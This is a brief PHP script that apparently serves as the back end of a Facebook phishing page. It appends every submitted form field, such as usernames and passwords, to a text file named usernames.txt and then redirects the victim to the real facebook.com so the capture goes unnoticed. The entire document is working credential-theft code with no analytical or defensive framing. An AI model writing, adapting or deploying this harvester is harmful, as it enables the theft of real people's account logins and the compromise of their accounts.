<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Redirect to Facebook
header('Location: http://www.facebook.com/');

// Open the file for appending
$handle = fopen("usernames.txt", "a");

// Write POST data to the file
foreach ($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}

// Add a newline at the end
fwrite($handle, "\r\n");

// Close the file
fclose($handle);
exit;
?>
